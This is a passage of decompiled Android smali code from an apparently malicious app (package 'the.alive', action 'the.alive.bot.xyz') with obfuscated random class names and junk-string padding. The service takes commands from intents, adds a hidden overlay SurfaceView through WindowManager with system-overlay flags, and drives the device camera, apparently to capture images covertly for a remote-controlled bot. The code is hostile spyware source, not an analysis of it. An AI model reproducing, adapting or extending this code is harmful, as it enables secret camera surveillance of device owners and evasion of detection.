    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const/4 v0, 0x0

    .line 1012
    sput v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->sf1:I

    const/4 v0, 0x0

    .line 1013
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->st:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;

    .line 1014
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->sp()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 19

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const/4 v2, 0x2

    .line 53
    :try_start_0
    new-instance v3, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14_CA;

    invoke-direct {v3, v4, v5}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v4, "the.alive.bot.xyz"

    invoke-virtual {v3, v4}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    invoke-virtual {v0, v3}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->sendBroadcast(Landroid/content/Intent;)V

    .line 55
    sget-object v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/ymykrkvaianymbrfluixxryzdtfotyvlwkygbmmclgedytmzxo13;->FTX1:Ljava/lang/String;

    const/4 v4, 0x1

    if-eqz v1, :cond_c

    .line 57
    invoke-virtual {v1, v3}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_c

    .line 61
    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->wm:Landroid/view/WindowManager;

    const/16 v6, 0x33

    if-eqz v5, :cond_1

    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->lay:Landroid/view/WindowManager$LayoutParams;

    if-eqz v5, :cond_1

    .line 63
    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->vul:[Ljava/lang/String;

    .line 64
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_k()Z

    move-result v1

    iput-boolean v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->usd:Z

    if-nez v1, :cond_0

    .line 67
    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_fw:Landroid/view/SurfaceView;

    .line 69
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->lay:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 70
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->wm:Landroid/view/WindowManager;

    sget-object v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_fw:Landroid/view/SurfaceView;

    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb72;->lay:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 71
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_fw:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 72
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->vul:[Ljava/lang/String;

    aget-object v1, v1, v4

    iget-object v3, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->vul:[Ljava/lang/String;

    aget-object v3, v3, v2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-virtual {v0, v1, v3}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->Completed_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_App(Ljava/lang/String;I)V

    goto/16 :goto_6

    .line 74
    :cond_0
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->sp()V

    goto/16 :goto_6

    .line 79
    :cond_1
    invoke-virtual {v1, v3}, Landroid/content/Intent;->getStringArrayExtra(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->vul:[Ljava/lang/String;

    .line 80
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_k()Z

    move-result v1

    iput-boolean v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->usd:Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez v1, :cond_b

    :try_start_1
    const-string v1, "window"

    .line 85
    invoke-virtual {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/WindowManager;

    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->w_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/view/WindowManager;

    .line 86
    new-instance v1, Landroid/view/SurfaceView;

    invoke-direct {v1, v0}, Landroid/view/SurfaceView;-><init>(Landroid/content/Context;)V

    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_fw:Landroid/view/SurfaceView;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_4

    .line 89
    :catch_0
    :try_start_2
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 90
    :goto_0
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    const/4 v5, 0x0

    const-string v7, "ask_battary"

    const-string v8, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    if-eqz v3, :cond_3

    .line 92
    :try_start_3
    sput-object v8, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 93
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v1, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    .line 95
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 96
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_0

    .line 102
    :cond_2
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_0

    .line 105
    :cond_3
    :goto_1
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_5

    .line 107
    sput-object v8, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 108
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v1, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_4

    .line 110
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 111
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_1

    .line 117
    :cond_4
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_1

    .line 120
    :cond_5
    :goto_2
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_7

    .line 122
    sput-object v8, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 123
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v1, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_6

    .line 125
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 126
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_2

    .line 132
    :cond_6
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_2

    .line 135
    :cond_7
    :goto_3
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_9

    .line 137
    sput-object v8, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 138
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v1, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_8

    .line 140
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 141
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_3

    .line 147
    :cond_8
    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    goto :goto_3

    .line 151
    :cond_9
    :goto_4
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x1a

    if-lt v1, v3, :cond_a

    .line 152
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v8, 0x1

    const/4 v9, 0x1

    const/16 v10, 0x7f6

    const/16 v11, 0x38

    const/4 v12, -0x3

    move-object v7, v1

    invoke-direct/range {v7 .. v12}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->la_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_y:Landroid/view/WindowManager$LayoutParams;

    goto :goto_5

    .line 163
    :cond_a
    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    const/4 v14, 0x1

    const/4 v15, 0x1

    const/16 v16, 0x7d6

    const/high16 v17, 0x40000

    const/16 v18, -0x3

    move-object v13, v1

    invoke-direct/range {v13 .. v18}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->la_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_y:Landroid/view/WindowManager$LayoutParams;

    .line 170
    :goto_5
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->la_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_y:Landroid/view/WindowManager$LayoutParams;

    iput v6, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 171
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->w_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/view/WindowManager;

    sget-object v3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_fw:Landroid/view/SurfaceView;

    sget-object v5, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->la_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_y:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v1, v3, v5}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 172
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_fw:Landroid/view/SurfaceView;

    invoke-virtual {v1}, Landroid/view/SurfaceView;->getHolder()Landroid/view/SurfaceHolder;

    move-result-object v1

    invoke-interface {v1, v0}, Landroid/view/SurfaceHolder;->addCallback(Landroid/view/SurfaceHolder$Callback;)V

    .line 173
    iget-object v1, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->vul:[Ljava/lang/String;

    aget-object v1, v1, v4

    iget-object v3, v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->vul:[Ljava/lang/String;

    aget-object v3, v3, v2

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-virtual {v0, v1, v3}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->Completed_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_App(Ljava/lang/String;I)V

    goto :goto_6

    .line 175
    :cond_b
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->sp()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :cond_c
    :goto_6
    return v4

    :catch_1
    return v2
.end method

.method public p_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_r()V
    .locals 2

    .line 835
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12$3;

    invoke-direct {v1, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12$3;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 1005
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public sp()V
    .locals 6

    const/4 v0, 0x0

    .line 1019
    :try_start_0
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    if-eqz v1, :cond_0

    .line 1020
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/hardware/Camera;->setPreviewCallback(Landroid/hardware/Camera$PreviewCallback;)V

    .line 1021
    sget-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    invoke-virtual {v1}, Landroid/hardware/Camera;->release()V

    .line 1022
    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

    .line 1024
    :cond_0
    invoke-direct {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->di()V

    .line 1025
    iget-boolean v1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->usd:Z
    :try_end_0
